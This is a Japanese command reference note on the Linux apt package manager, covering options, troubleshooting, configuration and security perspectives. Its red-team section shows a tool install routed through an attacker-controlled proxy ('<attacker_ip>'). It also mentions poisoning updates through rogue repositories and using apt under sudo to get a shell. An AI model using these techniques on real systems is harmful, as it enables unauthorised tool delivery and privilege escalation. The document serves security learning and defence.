---
# --- YAML Frontmatter ---
created: 2026-02-22 15:56
modified: 2026-02-23 09:52
environment: [OS/Linux, OS/Debian, OS/Ubuntu, OS/Kali]
vulnearability: [Privilege_Escalation, Supply_Chain_Attack, Improper_Update]
knowledge_category: Command
tags:
  - apt
  - bash
  - package-manager
  - knowledge_base
---

# Command - Linux - apt - パッケージの管理（インストール・更新・削除）を行う

## 概要

`apt` は、Debian系OSにおいてソフトウェア（パッケージ）のインストール、更新、削除、および依存関係の解決を行う高レベルなパッケージ管理コマンドです。

(出自: `apt` パッケージに含まれる。`apt-get` や `apt-cache` を統合・簡略化したツール)

## 類似コマンドと差異

| 類似コマンド | 差異 / 使い分けのポイント | 推奨 |
| :--- | :--- | :--- |
| `apt-get` | スクリプト内での利用に向く。挙動が安定しており後方互換性が高い。 | スクリプト利用 |
| `apt` | インタラクティブ（人間による操作）向け。進捗バーが表示され、直感的。 | ターミナル操作 |
| `dpkg` | ローカルの `.deb` ファイルを直接操作する低レベルツール。依存関係の解決は行わない。 | ローカルファイル操作 |
| `yum / dnf` | RedHat系（RHEL, CentOS, Fedora）で使用されるパッケージマネージャ。 | RHEL系環境 |

## よく連携されるコマンド

### シナリオ例: パッケージの完全なクリーンアップ (運用視点)

* **目的**: 不要になったパッケージと、その依存関係で残った不要なファイルを削除し、ディスク容量を空ける。
* **連携コマンド**: `apt purge`, `apt autoremove`
* **解説**: `remove` ではなく `purge` を使うことで設定ファイルまで削除し、`autoremove` で依存により入った孤立パッケージを掃除します。
* **コマンド例**:
    ```bash
    # 特定のパッケージを設定含め削除し、不要な依存も消す
    sudo apt purge <package_name> && sudo apt autoremove -y
    ```

## オプション説明

| オプション | 説明 |
| :--- | :--- |
| **基本操作** | |
| ⭐️ `update` | リポジトリのインデックスを更新する（インストール前に必須）。 |
| ⭐️ `upgrade` | インストール済みパッケージを最新版に更新する。 |
| `install` | 新しいパッケージをインストールする。 |
| `remove` | パッケージを削除する（設定ファイルは残る）。 |
| `purge` | パッケージを設定ファイルごと完全に削除する。 |
| **情報参照** | |
| `search <query>` | パッケージ名をキーワードで検索する。 |
| `show <package>` | パッケージの詳細情報（説明、依存関係など）を表示する。 |
| `list --installed` | インストール済みパッケージの一覧を表示する。 |

## よく使われるオプション組み合わせと業務シナリオ

### 1. インフラ構築・運用視点

* **タスク**: 新規サーバ構築時の初期セットアップ。
* **組み合わせ**: `update`, `upgrade -y`
* **解説**: OSを最新の状態にし、セキュリティパッチを適用した状態で構築を開始します。`-y` は全ての確認に Yes で答えるプロンプト省略です。
* **例**:
    ```bash
    # リポジトリ更新と全パッケージの最新化
    sudo apt update && sudo apt upgrade -y
    ```

### 2. ブルーチーム視点

* **タスク**: 意図しないパッケージやバックドアの有無を確認。
* **組み合わせ**: `list --installed`
* **解説**: 攻撃者によってインストールされた不審なツール（ncat, socat, 調査用スクリプト等）がないか、パッケージ一覧を確認します。
* **例**:
    ```bash
    # 特定の時期にインストールされたパッケージをログから抽出
    grep "install " /var/log/dpkg.log
    ```

### 3. レッドチーム視点

* **タスク**: 権限昇格（Privilege Escalation）のための調査とツール導入。
* **組み合わせ**: `apt-get` (スクリプト化しやすいため)
* **解説**: 権限がある場合、特定の脆弱な古いパッケージをインストールしたり、カスタムリポジトリを追加して悪意あるパッケージを流し込む手法があります。
* **例**:
    ```bash
    # プロキシ環境下でのツールインストール (Pivot先からの外部通信)
    sudo apt -o Acquire::http::Proxy="http://<attacker_ip>:8080" install <tool>
    ```

## エラーメッセージとトラブルシューティング

1.  **エラーメッセージ例 1**: `E: Could not get lock /var/lib/dpkg/lock-frontends - open (11: Resource temporarily unavailable)`
    * **考えられる原因**: 他のプロセス（自動更新など）が apt を使用中。
    * **解決策**: 数分待つか、実行中の `apt` / `unattended-upgr` プロセスを特定して終了させる。

2.  **エラーメッセージ例 2**: `E: Unable to locate package <package_name>`
    * **考えられる原因**: `apt update` を忘れているか、リポジトリにそのパッケージが存在しない。
    * **解決策**: `sudo apt update` を実行。それでもダメなら `/etc/apt/sources.list` にリポジトリを追加する。

## 環境変数と設定ファイル

### 影響を与える環境変数

* **`DEBIAN_FRONTEND=noninteractive`**: スクリプト実行時にダイアログを表示させず、デフォルト設定で進める際に使用。

### 関連する設定ファイル

* **`/etc/apt/sources.list`**: パッケージの取得元（リポジトリ）のリスト。
* **`/etc/apt/apt.conf.d/`**: プロキシ設定や自動更新の設定ファイル群。

## セキュリティに関する考慮事項

### 脆弱性と悪用事例

* **脆弱性**: 過去には `apt` の HTTP 通信を介した中間者攻撃（MITM）によるコード実行の脆弱性（CVE-2019-3462）がありました。
* **悪用シナリオ**: 攻撃者が `sudo` 権限を一部持っている場合、`apt` の設定（Aliasや設定ファイル）を改ざんして、更新時に偽のパッケージをインストールさせることができます。

### GTFOBins / LOLBAS における利用例

`apt` および `apt-get` は、sudo 権限がある場合に任意のシェルを起動したり、ファイルを読み書きするために利用されます。

* **機能**: `Shell`, `Sudo`, `Non-interactive bind shell`
* **参照**: `https://gtfobins.github.io/gtfobins/apt/`

### 対応策・緩和策 (ブルーチーム視点)

* **Prevention (予防)**: 必ず HTTPS リポジトリを使用するように設定し、GPGキーによる署名検証を無効にしない。
* **Detection (検知)**: `/etc/apt/sources.list.d/` 内の不審なファイルの生成や、未承認のリポジトリ追加を監視する。

## 注意点・補足

* **dist-upgrade vs upgrade**: `upgrade` は既存のパッケージを更新するだけですが、`full-upgrade` (または `dist-upgrade`) は依存関係の変化に応じてパッケージの削除や新規導入も行います。カーネル更新が含まれる場合はこちらが必要です。